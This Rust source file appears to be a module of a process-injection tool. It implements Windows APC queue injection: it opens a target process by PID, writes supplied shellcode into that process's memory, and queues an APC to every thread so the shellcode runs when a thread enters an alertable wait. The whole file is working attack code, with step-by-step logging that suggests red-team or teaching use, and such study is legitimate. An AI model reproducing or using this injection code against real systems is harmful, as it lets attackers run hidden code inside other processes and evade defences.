use crate::injection::InjectionResult;
use crate::log::LogSink;

#[cfg(windows)]
pub fn live_inject(
    pid: u32,
    shellcode: &[u8],
    log: &LogSink,
) -> Result<InjectionResult, String> {
    use super::common::{free_remote, write_remote_payload};
    use super::wrappers::wrap_for_apc;
    use windows::Win32::Foundation::{CloseHandle, FALSE};
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Thread32First, Thread32Next, THREADENTRY32, TH32CS_SNAPTHREAD,
    };
    use windows::Win32::System::Threading::{
        OpenProcess, OpenThread, QueueUserAPC, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
        PROCESS_VM_READ, PROCESS_VM_WRITE, THREAD_SET_CONTEXT,
    };

    log.step(format!(
        "[1/5] OpenProcess(PID {}) — PROCESS_QUERY_INFORMATION | PROCESS_VM_*",
        pid
    ));
    let process_access =
        PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE;
    let process = unsafe { OpenProcess(process_access, FALSE, pid) }.map_err(|e| {
        format!("OpenProcess failed: {e} (check privileges — try from an elevated shell)")
    })?;

    let wrapped = wrap_for_apc(shellcode);
    let size = wrapped.len();
    let base = write_remote_payload(process, &wrapped, 5, log)?;

    log.step("[5/5] QueueUserAPC — enumerating threads and queuing APCs");

    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) }.map_err(|e| {
        free_remote(process, base, log);
        format!("CreateToolhelp32Snapshot failed: {e}")
    })?;

    let mut entry = THREADENTRY32 {
        dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
        ..Default::default()
    };

    let mut queued: u32 = 0;
    let mut total: u32 = 0;

    if unsafe { Thread32First(snapshot, &mut entry) }.is_ok() {
        loop {
            if entry.th32OwnerProcessID == pid {
                total += 1;
                if let Ok(thread) =
                    unsafe { OpenThread(THREAD_SET_CONTEXT, FALSE, entry.th32ThreadID) }
                {
                    let apc_func = Some(unsafe {
                        core::mem::transmute::<
                            *mut core::ffi::c_void,
                            unsafe extern "system" fn(usize),
                        >(base)
                    });
                    if unsafe { QueueUserAPC(apc_func, thread, 0) } != 0 {
                        queued += 1;
                        log.info(format!(
                            "      queued APC to thread TID {}",
                            entry.th32ThreadID
                        ));
                    }
                    let _ = unsafe { CloseHandle(thread) };
                }
            }
            if unsafe { Thread32Next(snapshot, &mut entry) }.is_err() {
                break;
            }
        }
    }
    let _ = unsafe { CloseHandle(snapshot) };

    if queued == 0 {
        free_remote(process, base, log);
        let _ = unsafe { CloseHandle(process) };
        if total == 0 {
            return Err(format!("no threads found for PID {}", pid));
        }
        return Err(format!(
            "found {} threads but could not queue APC to any of them",
            total
        ));
    }

    let _ = unsafe { CloseHandle(process) };

    log.info(format!(
        "      APCs queued to {}/{} threads",
        queued, total
    ));
    log.warning("      shellcode executes when a thread enters alertable wait (async)");
    log.info(format!(
        "      shellcode at remote address {:#p} ({} bytes, wrapped {}+38)",
        base,
        size,
        size - 38
    ));
    Ok(InjectionResult {
        remote_base: base as u64,
        size,
    })
}

#[cfg(not(windows))]
pub fn live_inject(
    _pid: u32,
    _shellcode: &[u8],
    _log: &LogSink,
) -> Result<InjectionResult, String> {
    Err("live injection requires Windows — this build is running on a non-Windows host".to_string())
}
